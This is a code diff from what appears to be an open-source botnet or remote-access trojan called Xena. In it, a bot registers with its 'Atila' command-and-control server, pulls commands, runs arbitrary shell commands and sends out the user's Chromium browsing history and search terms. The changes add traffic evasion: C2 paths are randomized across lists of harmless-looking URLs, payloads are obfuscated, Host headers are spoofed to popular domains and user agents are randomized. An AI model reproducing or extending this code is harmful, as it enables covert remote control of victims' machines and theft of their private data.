@@ -62,7 +62,7 @@ type MessageAck struct {
 }
 
 // identify makes the bot known to the Atila server. Returns true if identification was successful.
-func identify(host, id string, publicKey *rsa.PublicKey) bool {
+func identify(host, id string, publicKey *rsa.PublicKey) error {
 	// Bot's identification details which will be stored in the Atila's database.
 	details := IdentifyPayload{
 		Id:        id,
@@ -73,31 +73,28 @@ func identify(host, id string, publicKey *rsa.PublicKey) bool {
 
 	detailsJson, err := json.Marshal(details)
 	if err != nil {
-		fmt.Println(err)
-		return false
+		return err
 	}
 
+	// Obfuscate the payload.
 	payloadJson, err := serializedTraffic(string(detailsJson))
 	if err != nil {
-		fmt.Println(err)
-		return false
+		return err
 	}
 
-	request, err := http.NewRequest("POST", host+"/v1/clients", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+randEntry(atilaClientInsertMap), bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
-		fmt.Println(err)
-		return false
+		return err
 	}
 	defer request.Body.Close()
 
 	client := &http.Client{}
 	response, err := client.Do(request)
 	if err != nil {
-		fmt.Println(err)
-		return false
+		return err
 	}
 	defer response.Body.Close()
 
@@ -105,10 +102,10 @@ func identify(host, id string, publicKey *rsa.PublicKey) bool {
 	// StatusConflict - We are already in the database.
 	if response.StatusCode != http.StatusCreated && response.StatusCode != http.StatusConflict {
 		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode) + ", expected:" + fmt.Sprint(http.StatusCreated) + "," + fmt.Sprint(http.StatusConflict))
-		return false
+		return err
 	}
 
-	return true
+	return nil
 }
 
 // messageAck changes a message's state. This will prevent the Atila from sending that message again.
@@ -128,7 +125,7 @@ func messageAck(host, messageId string) error {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+"/v1/messages/ack", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+randEntry(atilaAckMessageMap), bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
@@ -162,7 +159,7 @@ func sendMessage(host string, message Message) error {
 		return err
 	}
 
-	request, err := http.NewRequest("POST", host+"/v1/messages", bytes.NewBuffer([]byte(payloadJson)))
+	request, err := http.NewRequest("POST", host+randEntry(atilaPostMessageMap), bytes.NewBuffer([]byte(payloadJson)))
 	request.Host = randomPopularDomain()
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
@@ -204,6 +201,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 	if err != nil {
 		return reply, err
 	}
+
 	if claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
 		if claims["shell"] != nil {
 			content.Shell = fmt.Sprint(claims["shell"])
@@ -231,7 +229,6 @@ func interpretMessage(host string, message Message) (Message, error) {
 	} else if content.Shell == "/browserVisits" {
 		visits, err := grabChromiumHistory("VISITS")
 		if err != nil {
-			fmt.Println(err)
 			return reply, err
 		}
 
@@ -241,7 +238,6 @@ func interpretMessage(host string, message Message) (Message, error) {
 	} else if content.Shell == "/browserSearches" {
 		searches, err := grabChromiumHistory("TERMS")
 		if err != nil {
-			fmt.Println(err)
 			return reply, err
 		}
 
@@ -252,7 +248,6 @@ func interpretMessage(host string, message Message) (Message, error) {
 		term := content.Shell[8:]
 		searchResults, err := duckit(term)
 		if err != nil {
-			fmt.Println(err)
 			return reply, err
 		}
 		replyContent.WebSearchResults = searchResults
@@ -261,7 +256,6 @@ func interpretMessage(host string, message Message) (Message, error) {
 	} else {
 		replyContent.ShellOutput, err = runTerminal(content.Shell)
 		if err != nil {
-			fmt.Println(err)
 			return reply, err
 		}
 	}
@@ -278,7 +272,6 @@ func interpretMessage(host string, message Message) (Message, error) {
 
 	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
 	if err != nil {
-		fmt.Println(err)
 		return reply, err
 	}
 
@@ -293,7 +286,7 @@ func interpretMessage(host string, message Message) (Message, error) {
 func fetchMessages(host, id string) ([]Message, error) {
 	var messages []Message
 
-	request, err := http.NewRequest("GET", host+"/v1/messages?status=SENT&clientId="+id, nil)
+	request, err := http.NewRequest("GET", host+randEntry(atilaFetchMessagesMap)+"?status=SENT&clientId="+id, nil)
 	request.Host = randomPopularDomain()
 	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
@@ -303,16 +296,87 @@ func fetchMessages(host, id string) ([]Message, error) {
 	client := &http.Client{}
 	response, err := client.Do(request)
 	if err != nil {
-		fmt.Println(err)
+		return messages, err
 	}
 	defer response.Body.Close()
 
 	jsonDecoder := json.NewDecoder(response.Body)
 	jsonDecoder.DisallowUnknownFields()
-	jsonErr := jsonDecoder.Decode(&messages)
-	if jsonErr != nil {
+	err = jsonDecoder.Decode(&messages)
+	if err != nil {
 		return messages, err
 	}
 
 	return messages, nil
+}
+
+// Xena-Service-Atila GET /v1/clients
+var atilaClientInsertMap = []string{
+	"/v1/clients",
+	"/v1/account/user",
+	"/v1/account/userPreferences",
+	"/v1/common/notifications",
+	"/v1/asset",
+	"/blog",
+	"/books",
+	"/calendar",
+	"/careers",
+	"/people",
+	"/documentation",
+	"/faq",
+	"/help",
+	"/watch",
+}
+
+// Xena-Service-Atila GET /v1/messages
+var atilaFetchMessagesMap = []string{
+	"/v1/messages",
+	"/v1/logs",
+	"/home",
+	"/profile",
+	"/discussion",
+	"/edit",
+	"/support",
+	"/forum",
+	"/news",
+	"/notifications",
+	"/v1/notifications",
+	"/v2/notifications",
+	"/settings",
+	"/v1/settings",
+	"/v2/settings",
+	"/shop",
+}
+
+// Xena-Service-Atila POST /v1/messages
+var atilaPostMessageMap = []string{
+	"/v1/settings",
+	"/v2/edit",
+	"/v2/edit/post",
+	"/v1/readings",
+	"/accounts",
+	"/assets/images",
+	"/blog/rss",
+	"/company",
+	"/create",
+	"/events",
+	"/jobs",
+	"/products",
+	"/search",
+}
+
+// Xena-Service-Atila POST /v1/messages/ack
+var atilaAckMessageMap = []string{
+	"/v1/messages/ack",
+	"/style",
+	"/v1/events",
+	"/v1/playground",
+	"/v2/graphql",
+	"/v1/solutions/search",
+	"/sport",
+	"/views",
+	"/v1/views",
+	"/v2/views/data",
+	"/play",
+	"/confirmations",
 }
